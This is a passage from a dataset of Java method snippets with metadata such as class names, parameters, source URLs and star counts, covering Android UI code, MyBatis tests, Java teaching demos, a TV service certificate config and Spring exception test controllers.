"stars": "1", "class_props": {"extends": null, "implements": ["ViewTreeObserver", "Application"], "modifiers": ["final", "public"]}}, {"id": 31066, "method_name": "onGlobalLayout", "class_name": "KeyboardWatcher", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onGlobalLayout() {\n        final Rect r = new Rect();\n        //r will be populated with the coordinates of your view that area still visible.\n        mContentView.getWindowVisibleDisplayFrame(r);\n\n        final int heightDiff = mContentView.getRootView().getHeight() - (r.bottom - r.top);\n        if (!isSoftKeyboardOpened && heightDiff > mContentView.getRootView().getHeight() / 4) {\n            isSoftKeyboardOpened = true;\n            if ((mActivity.getWindow().getAttributes().flags & WindowManager.LayoutParams.FLAG_FULLSCREEN) != WindowManager.LayoutParams.FLAG_FULLSCREEN) {\n                if (mListeners != null) {\n                    mListeners.onSoftKeyboardOpened(heightDiff - mStatusBarHeight);\n                }\n            } else {\n                if (mListeners != null) {\n                    mListeners.onSoftKeyboardOpened(heightDiff);\n                }\n            }\n\n        } else if (isSoftKeyboardOpened && heightDiff < mContentView.getRootView().getHeight() / 4) {\n            isSoftKeyboardOpened = false;\n            if (mListeners != null) {\n                mListeners.onSoftKeyboardClosed();\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/other/KeyboardWatcher.java", "stars": "1", "class_props": {"extends": null, "implements": ["ViewTreeObserver", "Application"], "modifiers": ["final", "public"]}}, {"id": 31067, "method_name": "setListener", "class_name": "KeyboardWatcher", "params": ["SoftKeyboardStateListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setListener(SoftKeyboardStateListener listener) {\n        mListeners = listener;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/other/KeyboardWatcher.java", "stars": "1", "class_props": {"extends": null, "implements": ["ViewTreeObserver", "Application"], "modifiers": ["final", "public"]}}, {"id": 31068, "method_name": "onActivityCreated", "class_name": "KeyboardWatcher", "params": ["Activity", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onActivityCreated(@NonNull Activity activity, Bundle savedInstanceState) {}", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/other/KeyboardWatcher.java", "stars": "1", "class_props": {"extends": null, "implements": ["ViewTreeObserver", "Application"], "modifiers": ["final", "public"]}}, {"id": 31069, "method_name": "onActivityStarted", "class_name": "KeyboardWatcher", "params": ["Activity"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onActivityStarted(@NonNull Activity activity) {}", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/other/KeyboardWatcher.java", "stars": "1", "class_props": {"extends": null, "implements": ["ViewTreeObserver", "Application"], "modifiers": ["final", "public"]}}, {"id": 31070, "method_name": "onActivityResumed", "class_name": "KeyboardWatcher", "params": ["Activity"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onActivityResumed(@NonNull Activity activity) {}", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/other/KeyboardWatcher.java", "stars": "1", "class_props": {"extends": null, "implements": ["ViewTreeObserver", "Application"], "modifiers": ["final", "public"]}}, {"id": 31071, "method_name": "onActivityPaused", "class_name": "KeyboardWatcher", "params": ["Activity"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onActivityPaused(@NonNull Activity activity) {}", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/other/KeyboardWatcher.java", "stars": "1", "class_props": {"extends": null, "implements": ["ViewTreeObserver", "Application"], "modifiers": ["final", "public"]}}, {"id": 31072, "method_name": "onActivityStopped", "class_name": "KeyboardWatcher", "params": ["Activity"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onActivityStopped(@NonNull Activity activity) {}", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/other/KeyboardWatcher.java", "stars": "1", "class_props": {"extends": null, "implements": ["ViewTreeObserver", "Application"], "modifiers": ["final", "public"]}}, {"id": 31073, "method_name": "onActivitySaveInstanceState", "class_name": "KeyboardWatcher", "params": ["Activity", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onActivitySaveInstanceState(@NonNull Activity activity, @NonNull Bundle outState) {}", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/other/KeyboardWatcher.java", "stars": "1", "class_props": {"extends": null, "implements": ["ViewTreeObserver", "Application"], "modifiers": ["final", "public"]}}, {"id": 31074, "method_name": "onActivityDestroyed", "class_name": "KeyboardWatcher", "params": ["Activity"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onActivityDestroyed(@NonNull Activity activity) {\n        if (mActivity == activity) {\n            mActivity.getApplication().unregisterActivityLifecycleCallbacks(this);\n            mContentView.getViewTreeObserver().removeOnGlobalLayoutListener(this);\n\n            mActivity = null;\n            mContentView = null;\n            mListeners = null;\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/other/KeyboardWatcher.java", "stars": "1", "class_props": {"extends": null, "implements": ["ViewTreeObserver", "Application"], "modifiers": ["final", "public"]}}, {"id": 31075, "method_name": "testCrossReferenceXmlConfig", "class_name": "ParameterMapReferenceTest", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testCrossReferenceXmlConfig() throws Exception {\n    testCrossReference(getSqlSessionFactoryXmlConfig());\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/xml_external_ref/ParameterMapReferenceTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31076, "method_name": "testCrossReferenceJavaConfig", "class_name": "ParameterMapReferenceTest", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testCrossReferenceJavaConfig() throws Exception {\n    testCrossReference(getSqlSessionFactoryJavaConfig());\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/xml_external_ref/ParameterMapReferenceTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31077, "method_name": "testCrossReference", "class_name": "ParameterMapReferenceTest", "params": ["SqlSessionFactory"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void testCrossReference(SqlSessionFactory sqlSessionFactory) {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      ParameterMapReferencePersonMapper personMapper = sqlSession.getMapper(ParameterMapReferencePersonMapper.class);\n      Person parameter = new Person();\n      parameter.setId(1);\n      Person person = personMapper.select(parameter);\n      assertEquals((Integer)1, person.getId());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/xml_external_ref/ParameterMapReferenceTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31078, "method_name": "getSqlSessionFactoryXmlConfig", "class_name": "ParameterMapReferenceTest", "params": [], "throws": ["Exception"], "modifiers": ["private"], "return_type": "SqlSessionFactory", "snippet": "  private SqlSessionFactory getSqlSessionFactoryXmlConfig() throws Exception {\n    try (Reader configReader = Resources\n        .getResourceAsReader(\"org/apache/ibatis/submitted/xml_external_ref/ParameterMapReferenceMapperConfig.xml\")) {\n      SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(configReader);\n\n      initDb(sqlSessionFactory);\n\n      return sqlSessionFactory;\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/xml_external_ref/ParameterMapReferenceTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31079, "method_name": "getSqlSessionFactoryJavaConfig", "class_name": "ParameterMapReferenceTest", "params": [], "throws": ["Exception"], "modifiers": ["private"], "return_type": "SqlSessionFactory", "snippet": "  private SqlSessionFactory getSqlSessionFactoryJavaConfig() throws Exception {\n    Configuration configuration = new Configuration();\n    Environment environment = new Environment(\"development\", new JdbcTransactionFactory(), new UnpooledDataSource(\n        \"org.hsqldb.jdbcDriver\", \"jdbc:hsqldb:mem:xmlextref\", null));\n    configuration.setEnvironment(environment);\n    configuration.addMapper(ParameterMapReferencePersonMapper.class);\n    configuration.addMapper(ParameterMapReferencePetMapper.class);\n\n    SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(configuration);\n\n    initDb(sqlSessionFactory);\n\n    return sqlSessionFactory;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/xml_external_ref/ParameterMapReferenceTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31080, "method_name": "initDb", "class_name": "ParameterMapReferenceTest", "params": ["SqlSessionFactory"], "throws": ["IOException", "SQLException"], "modifiers": ["private", "static"], "return_type": "void", "snippet": "  private static void initDb(SqlSessionFactory sqlSessionFactory) throws IOException, SQLException {\n    BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),\n            \"org/apache/ibatis/submitted/xml_external_ref/CreateDB.sql\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/xml_external_ref/ParameterMapReferenceTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 31081, "method_name": "printString", "class_name": "Demo01Printable", "params": ["Printable"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void printString(Printable p) {\n        p.print(\"HelloWorld\");\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/24.%E3%80%90Stream%E6%B5%81%E3%80%81%E6%96%B9%E6%B3%95%E5%BC%95%E7%94%A8%E3%80%91%E7%AC%94%E8%AE%B0/code/13_StreamAndMethodReference/src/com/itheima/demo04/MethodReference/Demo01Printable.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31082, "method_name": "main", "class_name": "Demo01Printable", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        //\u8c03\u7528printString\u65b9\u6cd5,\u65b9\u6cd5\u7684\u53c2\u6570Printable\u662f\u4e00\u4e2a\u51fd\u6570\u5f0f\u63a5\u53e3,\u6240\u4ee5\u53ef\u4ee5\u4f20\u9012Lambda\n        printString((s) -> {\n            System.out.println(s);\n        });\n\n        /*\n            \u5206\u6790:\n                Lambda\u8868\u8fbe\u5f0f\u7684\u76ee\u7684,\u6253\u5370\u53c2\u6570\u4f20\u9012\u7684\u5b57\u7b26\u4e32\n                \u628a\u53c2\u6570s,\u4f20\u9012\u7ed9\u4e86System.out\u5bf9\u8c61,\u8c03\u7528out\u5bf9\u8c61\u4e2d\u7684\u65b9\u6cd5println\u5bf9\u5b57\u7b26\u4e32\u8fdb\u884c\u4e86\u8f93\u51fa\n                \u6ce8\u610f:\n                    1.System.out\u5bf9\u8c61\u662f\u5df2\u7ecf\u5b58\u5728\u7684\n                    2.println\u65b9\u6cd5\u4e5f\u662f\u5df2\u7ecf\u5b58\u5728\u7684\n                \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u65b9\u6cd5\u5f15\u7528\u6765\u4f18\u5316Lambda\u8868\u8fbe\u5f0f\n                \u53ef\u4ee5\u4f7f\u7528System.out\u65b9\u6cd5\u76f4\u63a5\u5f15\u7528(\u8c03\u7528)println\u65b9\u6cd5\n         */\n        printString(System.out::println);\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/24.%E3%80%90Stream%E6%B5%81%E3%80%81%E6%96%B9%E6%B3%95%E5%BC%95%E7%94%A8%E3%80%91%E7%AC%94%E8%AE%B0/code/13_StreamAndMethodReference/src/com/itheima/demo04/MethodReference/Demo01Printable.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31083, "method_name": "precioMedioAutomovil", "class_name": "Ford_L", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int precioMedioAutomovil() {\n        return 10000000;\n    }", "url": "https://raw.githubusercontent.com/EduarAlexis/SOLID/master/src/main/java/Solid/L/Ford_L.java", "stars": "1", "class_props": {"extends": "AbsAutomovil_L", "implements": null, "modifiers": ["public"]}}, {"id": 31084, "method_name": "numAsientos", "class_name": "Ford_L", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int numAsientos() {\n        return 5;\n    }", "url": "https://raw.githubusercontent.com/EduarAlexis/SOLID/master/src/main/java/Solid/L/Ford_L.java", "stars": "1", "class_props": {"extends": "AbsAutomovil_L", "implements": null, "modifiers": ["public"]}}, {"id": 31085, "method_name": "onMenuItemClick", "class_name": "PopupMenu_OnMenuItemClickListenerImplementor", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onMenuItemClick (android.view.MenuItem p0)\n\t{\n\t\treturn n_onMenuItemClick (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v7/widget/PopupMenu_OnMenuItemClickListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31086, "method_name": "n_onMenuItemClick", "class_name": "PopupMenu_OnMenuItemClickListenerImplementor", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onMenuItemClick (android.view.MenuItem p0);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v7/widget/PopupMenu_OnMenuItemClickListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31087, "method_name": "monodroidAddReference", "class_name": "PopupMenu_OnMenuItemClickListenerImplementor", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v7/widget/PopupMenu_OnMenuItemClickListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31088, "method_name": "monodroidClearReferences", "class_name": "PopupMenu_OnMenuItemClickListenerImplementor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v7/widget/PopupMenu_OnMenuItemClickListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31089, "method_name": "getFirst", "class_name": "Triple", "params": [], "throws": null, "modifiers": ["public"], "return_type": "A", "snippet": "    public A getFirst() {\n        return first;\n    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab6/master/src/main/java/com/demkom58/divine/util/Triple.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31090, "method_name": "getSecond", "class_name": "Triple", "params": [], "throws": null, "modifiers": ["public"], "return_type": "B", "snippet": "    public B getSecond() {\n        return second;\n    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab6/master/src/main/java/com/demkom58/divine/util/Triple.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31091, "method_name": "getThird", "class_name": "Triple", "params": [], "throws": null, "modifiers": ["public"], "return_type": "C", "snippet": "    public C getThird() {\n        return third;\n    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab6/master/src/main/java/com/demkom58/divine/util/Triple.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31092, "method_name": "main", "class_name": "Demo02Ineger", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        /*\n            \u81ea\u52a8\u88c5\u7bb1:\u76f4\u63a5\u628aint\u7c7b\u578b\u7684\u6574\u6570\u8d4b\u503c\u5305\u88c5\u7c7b\n            Integer in = 1; \u5c31\u76f8\u5f53\u4e8e Integer in = new Integer(1);\n         */\n        Integer in = 1;\n\n        /*\n            \u81ea\u52a8\u62c6\u7bb1:in\u662f\u5305\u88c5\u7c7b,\u65e0\u6cd5\u76f4\u63a5\u53c2\u4e0e\u8fd0\u7b97,\u53ef\u4ee5\u81ea\u52a8\u8f6c\u6362\u4e3a\u57fa\u672c\u6570\u636e\u7c7b\u578b,\u5728\u8fdb\u884c\u8ba1\u7b97\n            in+2;\u5c31\u76f8\u5f53\u4e8e in.intVale() + 2 = 3\n            in = in.intVale() + 2 = 3 \u53c8\u662f\u4e00\u4e2a\u81ea\u52a8\u88c5\u7bb1\n         */\n        in = in+2;\n\n        ArrayList<Integer> list = new ArrayList<>();\n        /*\n            ArrayList\u96c6\u5408\u65e0\u6cd5\u76f4\u63a5\u5b58\u50a8\u6574\u6570,\u53ef\u4ee5\u5b58\u50a8Integer\u5305\u88c5\u7c7b\n         */\n        list.add(1); //-->\u81ea\u52a8\u88c5\u7bb1 list.add(new Integer(1));\n\n        int a = list.get(0); //-->\u81ea\u52a8\u62c6\u7bb1  list.get(0).intValue();\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/12.%E3%80%90Object%E7%B1%BB%E3%80%81%E5%B8%B8%E7%94%A8API%E3%80%91-%E7%AC%94%E8%AE%B0/code/01_API/src/com/itheima/demo07Integer/Demo02Ineger.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31093, "method_name": "onCreateDialog", "class_name": "ColorPickerDialogFragment", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "Dialog", "snippet": "    public Dialog onCreateDialog(Bundle savedInstanceState) {\n        View view = View.inflate(getActivity(), R.layout.fragment_dialog_colorpicker, null);\n        ButterKnife.bind(this, view);\n\n        colorPicker.addSVBar(svBar);\n        colorPicker.addOpacityBar(opacityBar);\n\n        AlertDialog.Builder builder = new AlertDialog.Builder(getActivity());\n\n        if (getArguments() == null || !getArguments().containsKey(TITLE) || mOnResultListener == null) {\n            return builder.create();\n        }\n\n        if (getArguments().containsKey(DEFAULT_VALUE)) {\n            int color = getArguments().getInt(DEFAULT_VALUE);\n            colorPicker.setColor(color);\n            colorPicker.setOldCenterColor(color);\n            colorPicker.setNewCenterColor(color);\n        }\n\n        builder\n                .setView(view)\n                .setTitle(getArguments().getString(TITLE))\n                .setPositiveButton(R.string.ok,\n                        new DialogInterface.OnClickListener() {\n                            @Override\n                            public void onClick(DialogInterface dialog, int which) {\n                                mOnResultListener.onNewValue(colorPicker.getColor());\n                                dialog.dismiss();\n                            }\n                        })\n                .setNegativeButton(R.string.cancel,\n                        new DialogInterface.OnClickListener() {\n                            @Override\n                            public void onClick(DialogInterface dialog, int which) {\n                                dialog.dismiss();\n                            }\n                        }\n                );\n\n        return builder.create();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/fragments/dialog/ColorPickerDialogFragment.java", "stars": "4", "class_props": {"extends": "DialogFragment", "implements": null, "modifiers": ["public"]}}, {"id": 31094, "method_name": "setOnResultListener", "class_name": "ColorPickerDialogFragment", "params": ["ResultListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOnResultListener(ResultListener resultListener) {\n        mOnResultListener = resultListener;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/fragments/dialog/ColorPickerDialogFragment.java", "stars": "4", "class_props": {"extends": "DialogFragment", "implements": null, "modifiers": ["public"]}}, {"id": 31095, "method_name": "getLayoutId", "class_name": "NormalGSYVideoPlayer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getLayoutId() {\n        return R.layout.video_layout_normal;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/NormalGSYVideoPlayer.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 31096, "method_name": "updateStartImage", "class_name": "NormalGSYVideoPlayer", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void updateStartImage() {\n        if(mStartButton instanceof ImageView) {\n            ImageView imageView = (ImageView) mStartButton;\n            if (mCurrentState == CURRENT_STATE_PLAYING) {\n                imageView.setImageResource(R.drawable.video_click_pause_selector);\n            } else if (mCurrentState == CURRENT_STATE_ERROR) {\n                imageView.setImageResource(R.drawable.video_click_play_selector);\n            } else {\n                imageView.setImageResource(R.drawable.video_click_play_selector);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/NormalGSYVideoPlayer.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 31097, "method_name": "getClientKey", "class_name": "WebOSTVServiceConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getClientKey() {\n        return clientKey;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/config/WebOSTVServiceConfig.java", "stars": "4", "class_props": {"extends": "ServiceConfig", "implements": null, "modifiers": ["public"]}}, {"id": 31098, "method_name": "setClientKey", "class_name": "WebOSTVServiceConfig", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setClientKey(String clientKey) {\n        this.clientKey = clientKey;\n        notifyUpdate();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/config/WebOSTVServiceConfig.java", "stars": "4", "class_props": {"extends": "ServiceConfig", "implements": null, "modifiers": ["public"]}}, {"id": 31099, "method_name": "getServerCertificate", "class_name": "WebOSTVServiceConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "X509Certificate", "snippet": "    public X509Certificate getServerCertificate() {\n        return cert;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/config/WebOSTVServiceConfig.java", "stars": "4", "class_props": {"extends": "ServiceConfig", "implements": null, "modifiers": ["public"]}}, {"id": 31100, "method_name": "setServerCertificate", "class_name": "WebOSTVServiceConfig", "params": ["X509Certificate"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setServerCertificate(X509Certificate cert) {\n        this.cert = cert;\n        notifyUpdate();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/config/WebOSTVServiceConfig.java", "stars": "4", "class_props": {"extends": "ServiceConfig", "implements": null, "modifiers": ["public"]}}, {"id": 31101, "method_name": "setServerCertificate", "class_name": "WebOSTVServiceConfig", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setServerCertificate(String cert) {\n        this.cert = loadCertificateFromPEM(cert);\n        notifyUpdate();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/config/WebOSTVServiceConfig.java", "stars": "4", "class_props": {"extends": "ServiceConfig", "implements": null, "modifiers": ["public"]}}, {"id": 31102, "method_name": "getServerCertificateInString", "class_name": "WebOSTVServiceConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getServerCertificateInString() {\n        return exportCertificateToPEM(this.cert);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/config/WebOSTVServiceConfig.java", "stars": "4", "class_props": {"extends": "ServiceConfig", "implements": null, "modifiers": ["public"]}}, {"id": 31103, "method_name": "exportCertificateToPEM", "class_name": "WebOSTVServiceConfig", "params": ["X509Certificate"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String exportCertificateToPEM(X509Certificate cert) {\n        try {\n            if (cert == null) \n                return null;\n            return Base64.encodeToString(cert.getEncoded(), Base64.DEFAULT);\n        } catch (CertificateEncodingException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/config/WebOSTVServiceConfig.java", "stars": "4", "class_props": {"extends": "ServiceConfig", "implements": null, "modifiers": ["public"]}}, {"id": 31104, "method_name": "loadCertificateFromPEM", "class_name": "WebOSTVServiceConfig", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "X509Certificate", "snippet": "    private X509Certificate loadCertificateFromPEM(String pemString) {\n        CertificateFactory certFactory;\n        try {\n            certFactory = CertificateFactory.getInstance(\"X.509\");\n            ByteArrayInputStream inputStream = new ByteArrayInputStream(pemString.getBytes(\"US-ASCII\"));\n\n            return (X509Certificate)certFactory.generateCertificate(inputStream);\n        } catch (CertificateException e) {\n            e.printStackTrace();\n            return null;\n        } catch (UnsupportedEncodingException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/config/WebOSTVServiceConfig.java", "stars": "4", "class_props": {"extends": "ServiceConfig", "implements": null, "modifiers": ["public"]}}, {"id": 31105, "method_name": "toJSONObject", "class_name": "WebOSTVServiceConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "JSONObject", "snippet": "    public JSONObject toJSONObject() {\n        JSONObject jsonObj = super.toJSONObject();\n\n        try {\n            jsonObj.put(KEY_CLIENT_KEY, clientKey);\n            jsonObj.put(KEY_CERT, exportCertificateToPEM(cert));\n        } catch (JSONException e) {\n            e.printStackTrace();\n        }\n\n        return jsonObj;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/config/WebOSTVServiceConfig.java", "stars": "4", "class_props": {"extends": "ServiceConfig", "implements": null, "modifiers": ["public"]}}, {"id": 31106, "method_name": "concurrencyFailure", "class_name": "ExceptionTranslatorTestController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void concurrencyFailure() {\n        throw new ConcurrencyFailureException(\"test concurrency failure\");\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/errors/ExceptionTranslatorTestController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31107, "method_name": "methodArgument", "class_name": "ExceptionTranslatorTestController", "params": ["TestDTO"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void methodArgument(@Valid @RequestBody TestDTO testDTO) {\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/errors/ExceptionTranslatorTestController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31108, "method_name": "missingServletRequestPartException", "class_name": "ExceptionTranslatorTestController", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void missingServletRequestPartException(@RequestPart String part) {\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/errors/ExceptionTranslatorTestController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31109, "method_name": "missingServletRequestParameterException", "class_name": "ExceptionTranslatorTestController", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void missingServletRequestParameterException(@RequestParam String param) {\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/errors/ExceptionTranslatorTestController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31110, "method_name": "accessdenied", "class_name": "ExceptionTranslatorTestController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void accessdenied() {\n        throw new AccessDeniedException(\"test access denied!\");\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/errors/ExceptionTranslatorTestController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31111, "method_name": "unauthorized", "class_name": "ExceptionTranslatorTestController", "params": [], "throws": null, 